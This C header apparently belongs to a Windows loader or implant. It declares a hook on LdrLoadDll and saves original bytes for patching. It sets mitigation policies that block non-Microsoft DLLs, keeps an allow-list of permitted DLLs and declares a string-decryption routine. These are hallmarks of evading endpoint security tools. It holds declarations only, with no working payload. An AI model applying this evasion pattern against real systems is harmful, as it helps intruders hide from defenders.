#pragma once
#include <windows.h>

#define PROC_THREAD_ATTRIBUTE_NUMBER    0x0000FFFF
#define PROC_THREAD_ATTRIBUTE_THREAD    0x00010000
#define PROC_THREAD_ATTRIBUTE_INPUT     0x00020000
#define PROC_THREAD_ATTRIBUTE_ADDITIVE  0x00040000

#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON (0x00000001ULL << 44)
#define PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_LOW_LABEL_ALWAYS_ON      (0x00000001ULL << 56)
#define PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_REMOTE_ALWAYS_ON         (0x00000001ULL << 52)
#define PROCESS_CREATION_MITIGATION_POLICY_FONT_DISABLE_ALWAYS_ON                 (0x00000001ULL << 48)
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON (0x00000001ULL << 44)
#define PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON        (0x00000001ULL << 36)

#define ProcThreadAttributeValue(Number, Thread, Input, Additive) \
                                (((Number) & PROC_THREAD_ATTRIBUTE_NUMBER) | \
                                ((Thread != FALSE) ? PROC_THREAD_ATTRIBUTE_THREAD : 0) | \
                                ((Input != FALSE) ? PROC_THREAD_ATTRIBUTE_INPUT : 0) | \
                                ((Additive != FALSE) ? PROC_THREAD_ATTRIBUTE_ADDITIVE : 0))

#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY ProcThreadAttributeValue(7, FALSE, TRUE, FALSE)

// these are the only DLLs allowed into our process when running in secure mode,
// to allow a new DLL, simply add it to the 'AllowDlls' array and increment 'AllowDllCount' by 1
#define AllowDllCount 13
char AllowDlls[AllowDllCount][MAX_PATH] = {
                                            "rpcrt4.dll",
                                            "winhttp.dll",
                                            "kernel32.dll",
                                            "ext-ms-win-kernel32-errorhandling-l1-1-0.dll",
                                            "C:\\Windows\\system32\\mswsock.dll",
                                            "C:\\Windows\\system32\\schannel.DLL",
                                            "C:\\Windows\\system32\\ncryptsslp.dll",
                                            "C:\\Windows\\system32\\bcryptprimitives.dll",
                                            "C:\\Windows\\system32\\rsaenh.dll",
                                            "cryptnet.dll",
                                            "ntdll.dll",
                                            "C:\\Windows\\system32\\OnDemandConnRouteHelper.dll",
                                            "C:\\Windows\\system32\\apphelp.dll"
                                          };

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _STARTUPINFOEXA {
  STARTUPINFOA                 StartupInfo;
  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
} STARTUPINFOEXA, *LPSTARTUPINFOEXA;

NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress);

typedef void (WINAPI * LdrLoadDll_) (PWSTR SearchPath OPTIONAL,
                                     PULONG DllCharacteristics OPTIONAL,
                                     PUNICODE_STRING DllName,
                                     PVOID *BaseAddress);

LPVOID lAddr;
char OriginalBytes[50] = {};

BOOL ProcessMitigationActive = TRUE;

char* decrypt_string(char* string, int key);